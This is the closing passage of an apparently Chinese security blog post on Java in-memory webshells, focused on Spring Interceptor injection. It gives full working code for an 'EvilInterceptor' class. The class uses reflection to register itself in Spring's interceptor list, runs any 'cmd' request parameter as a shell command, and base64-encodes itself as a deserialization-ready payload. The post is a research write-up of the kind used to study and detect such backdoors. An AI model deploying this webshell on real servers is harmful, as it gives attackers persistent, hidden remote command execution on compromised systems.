<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为给定的 handler 构建并返回一个 &#123;<span class="doctag">@link</span> HandlerExecutionChain&#125;，其中包含</span></span><br><span class="line"><span class="comment"> * 与当前请求匹配的拦截器（HandlerInterceptor）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 默认实现：</span></span><br><span class="line"><span class="comment"> * 1) 若传入的 handler 已经是 HandlerExecutionChain，则在其基础上“扩展”；</span></span><br><span class="line"><span class="comment"> *    否则用该 handler 新建一个 HandlerExecutionChain。</span></span><br><span class="line"><span class="comment"> * 2) 遍历当前 HandlerMapping 注册过的拦截器列表（adaptedInterceptors）：</span></span><br><span class="line"><span class="comment"> *    - 普通拦截器：直接加入执行链；</span></span><br><span class="line"><span class="comment"> *    - MappedInterceptor（带路径匹配规则的拦截器）：仅当匹配当前请求 URL 时才加入。</span></span><br><span class="line"><span class="comment"> * 3) 拦截器按“注册顺序”加入到执行链中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 子类可覆盖本方法以“增删/重排”拦截器；如果只是简单追加拦截器，建议先调用</span></span><br><span class="line"><span class="comment"> * super.getHandlerExecutionChain(handler, request)，再对返回的 chain 调用 addInterceptor。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> handler  解析到的目标处理器（可能是原始处理器对象，也可能已是 HandlerExecutionChain）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> request  当前 HTTP 请求</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 永不为 null 的 HandlerExecutionChain</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #getAdaptedInterceptors()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandlerExecutionChain</span><span class="params">(Object handler, HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="comment">// 若 handler 已是执行链，则直接复用并在其上追加拦截器；否则用 handler 新建执行链</span></span><br><span class="line">    <span class="type">HandlerExecutionChain</span> <span class="variable">chain</span> <span class="operator">=</span> (handler <span class="keyword">instanceof</span> HandlerExecutionChain ?</span><br><span class="line">            (HandlerExecutionChain) handler : <span class="keyword">new</span> <span class="title class_">HandlerExecutionChain</span>(handler));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 依注册顺序遍历所有拦截器</span></span><br><span class="line">    <span class="keyword">for</span> (HandlerInterceptor interceptor : <span class="built_in">this</span>.adaptedInterceptors) &#123;</span><br><span class="line">        <span class="keyword">if</span> (interceptor <span class="keyword">instanceof</span> MappedInterceptor) &#123;</span><br><span class="line">            <span class="comment">// 带路径匹配条件的拦截器：仅当匹配当前请求时才加入</span></span><br><span class="line">            <span class="type">MappedInterceptor</span> <span class="variable">mappedInterceptor</span> <span class="operator">=</span> (MappedInterceptor) interceptor;</span><br><span class="line">            <span class="keyword">if</span> (mappedInterceptor.matches(request)) &#123;</span><br><span class="line">                chain.addInterceptor(mappedInterceptor.getInterceptor());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 普通（全局）拦截器：无条件加入</span></span><br><span class="line">            chain.addInterceptor(interceptor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> chain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="内存马实现-1"><a href="#内存马实现-1" class="headerlink" title="内存马实现"></a>内存马实现</h4><p>首先通过 <code>getBean</code> 方法从上下文中获取 <code>RequestMappingHandlerMapping</code>，这个就是前面分析中的 <code>AbstractHandlerMapping</code> 抽象类的实现类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure></div>

<p>之后我们需要将恶意 Interceptor 添加到 <code>RequestMappingHandlerMapping#adaptedInterceptors</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TestInterceptor evilInterceptor=<span class="keyword">new</span> <span class="title class_">EvilInterceptor</span>();</span><br><span class="line">adtedinterceptors.add(evilInterceptor);</span><br></pre></td></tr></table></figure></div>

<p>完整代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilInterceptor</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="type">AbstractHandlerMapping</span> <span class="variable">handlerMapping</span> <span class="operator">=</span> applicationContext.getBean(<span class="string">&quot;requestMappingHandlerMapping&quot;</span>, AbstractHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">adaptedInterceptors</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">            adaptedInterceptors.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            ((ArrayList&lt;Object&gt;) adaptedInterceptors.get(handlerMapping)).add(<span class="keyword">new</span> <span class="title class_">EvilInterceptor</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            response.getWriter().write(output);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(Repository.lookupClass(EvilInterceptor.class).getBytes());</span><br><span class="line">        System.out.println(b64.length());</span><br><span class="line">        System.out.println(b64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Java 内存马</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-10-02 14:39:21</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-10-06 22:47:36
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/10/02/Java 内存马/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/java-web/">#java web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/10/21/Java%20%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java 常见组件</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/10/02/Java%20%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java 表达式注入</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Java 内存马</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">基本概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E6%90%9C%E7%B4%A2"><span class="nav-text">对象搜索</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%B9%E5%99%A8%E8%B0%83%E8%AF%95"><span class="nav-text">容器调试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%B9%E5%99%A8%E7%B1%BB%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">容器类内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">Tomcat 内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Tomcat-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="nav-text">Tomcat 常见问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96-StandardContext"><span class="nav-text">如何获取 StandardContext</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%8E-ServletRequest-%E8%8E%B7%E5%8F%96"><span class="nav-text">从 ServletRequest 获取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%8E-ApplicationFilterChain-%E8%8E%B7%E5%8F%96"><span class="nav-text">从 ApplicationFilterChain 获取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%8E-AbstractProcessor-%E8%8E%B7%E5%8F%96"><span class="nav-text">从 AbstractProcessor 获取</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4%E8%BF%87%E9%95%BF%E9%97%AE%E9%A2%98"><span class="nav-text">请求头过长问题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-Servlet-API"><span class="nav-text">基于 Servlet API</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">Servlet 型内存马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">Filter 型内存马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">Listener 型内存马</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-Tomcat-%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="nav-text">基于 Tomcat 中间件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">Valve 型内存马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Executor-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">Executor 型内存马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Upgrade-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">Upgrade 型内存马</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Jetty-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">Jetty 内存马</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E7%B1%BB"><span class="nav-text">框架类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Spring-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">Spring 内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WebApplicationContext"><span class="nav-text">WebApplicationContext</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-WebApplicationContext"><span class="nav-text">什么是 WebApplicationContext</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Root-WebApplicationContext"><span class="nav-text">Root WebApplicationContext</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Child-WebApplicationContext"><span class="nav-text">Child WebApplicationContext</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-WebApplicationContext"><span class="nav-text">获取 WebApplicationContext</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ContextLoader"><span class="nav-text">ContextLoader</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WebApplicationContextUtils"><span class="nav-text">WebApplicationContextUtils</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#RequestContextUtils"><span class="nav-text">RequestContextUtils</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#getAttribute"><span class="nav-text">getAttribute</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E8%8E%B7%E5%8F%96%EF%BC%88%E4%BB%85%E9%80%82%E7%94%A8%E4%BA%8ESpringboot%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="nav-text">反射获取（仅适用于Springboot环境）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Controller-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">Controller 内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Controller-%E6%B4%BE%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="nav-text">Controller 派发流程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Controller-%E6%B3%A8%E5%86%8C%E6%B5%81%E7%A8%8B"><span class="nav-text">Controller 注册流程</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="nav-text">内存马实现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#registryMapping"><span class="nav-text">registryMapping</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#detectHandlerMethods"><span class="nav-text">detectHandlerMethods</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#registerHandler"><span class="nav-text">registerHandler</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Interceptor-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">Interceptor 内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-text">源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Interceptor-%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="nav-text">Interceptor 执行流程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Interceptor-%E6%B3%A8%E5%86%8C%E6%B5%81%E7%A8%8B"><span class="nav-text">Interceptor 注册流程</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0-1"><span class="nav-text">内存马实现</span></a></li></ol></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        56 posts in total
                    </span>
                    
                        <span>
                            1114.7k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
